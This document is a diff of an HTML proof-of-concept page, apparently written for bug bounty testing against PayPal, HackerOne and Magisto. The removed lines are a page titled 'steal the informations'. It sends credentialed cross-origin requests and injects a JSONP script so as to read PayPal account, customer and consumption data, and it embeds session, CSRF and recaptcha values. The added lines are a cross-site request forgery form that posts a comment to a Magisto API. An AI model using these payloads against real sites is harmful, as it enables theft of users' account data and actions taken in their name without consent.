@@ -2,68 +2,8 @@
 <html>
 <head>
 <meta name="referrer" content="never">
-<script src="jquery-3.4.1.min.js"></script>
-</head>
-<title>steal the informations</title>
-<div text="steal account's information">
-steal account's information
-<textarea id="account" style="width: 200px; height: 150px;"></textarea>
-</div>
-<div text="steal customer's personal informaiton">
-steal customer's personal informaiton
-<textarea id="customer" style="width: 200px; height: 150px;"></textarea>
-</div>
-<div text="steal customer's consumption">
-steal customer's consumption
-<textarea id="consumption" style="width: 200px; height: 150px;"></textarea>
-</div>
-<script type="text/javascript">
-    function handleResponse(response){
-            console.log(response);
-    }
-</script>
-<script>
-
-     var xmlhttp2 = new XMLHttpRequest()
-
-	
-     xmlhttp2.onreadystatechange=function()
-	{
-		if (xmlhttp2.readyState==4 && xmlhttp2.status==200)
-		{
-			document.getElementById("consumption").innerHTML = xmlhttp2.responseText;
-			console.log("steal customer's consumption successed");
-		}
-	}
-    	
-	xmlhttp2.open("GET","https://www.paypal.com/invoice/logo/remove",true);
-	xmlhttp2.withCredentials = true;
-	xmlhttp2.send();
-	
-	$.ajax({
-	    type: "POST",
-	    url: "https://www.paypal.com/auth/validatecaptcha",
-	   contentType: "application/x-www-form-urlencoded", 
-	   data: {_csrf: 'DFjRaYL8oaYBb4VomrW7K1jQzVhXBvxbCS%2Fv8%3D',_sessionID:'qAaSNGdUjxcPsS1yN6gj0P4uH587ysAP',jse:'473a7da7a376614863bcbb3c7caf4a87',recaptcha:'03AOLTBLQantoR0v5uyKF94q7LP_y8v8Rd4h4JyK_9Wx6r94n3P3s96TMf2KA-thBY6eN2h6s-A76OGHr3UGSZjuUrm8AkjGRQXGLPXR2QJwd-U5byDWkh_kqwC1-78Mr6wa6p2zqzBWnjIqKpFa6pvSzvpgnAABaNBCFzbv78BBitJkOv8eF3B3eSy-3jcYqi1oBzc-6eFggLktKg2QLZRkJuNSGkRyJnHY8rDnWCnrb7-VI_CEH5G3QeSe755ReqN0H6td77eXwEpaCc6XFcO6y8iusiP-pTLCdLfmwFzppKh5N6YE157ye88eYukk5kr2uomMgB68gy'},
-	    success: function(data) {
-		console.log(data);
-	    }
-	});
-	window.open("https://www.paypal.com/invoice/logo/remove")
-	window.onload = function() {
-
-	    var oBtn = document.getElementById('btn');
-
-	    oBtn.onclick = function() {     
-
-		var script = document.createElement("script");
-		script.src = "https://www.paypal.com/bizcomponents/userInfo?callback=handleResponse";
-		document.body.insertBefore(script, document.body.firstChild);   
-	    };
-	};
-</script>
-<script src="https://www.paypal.com/auth/createchallenge/f77e4df7782eb734/recaptchav3.js?_sessionID="></script>
-<script src="https://hackerone.com/current_user/graphql_token.js"></script>
-<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
-	<button id="btn">测试Jsonp</button>
+ <form action="https://www.magisto.com/api/video/comments/IEMYNFcSRDYpDhdiCzE" method="POST">
+      <input type="hidden" name="comment" value="right on csrf" />
+      <input type="submit" value="Submit request" />
+    </form>
 </html>
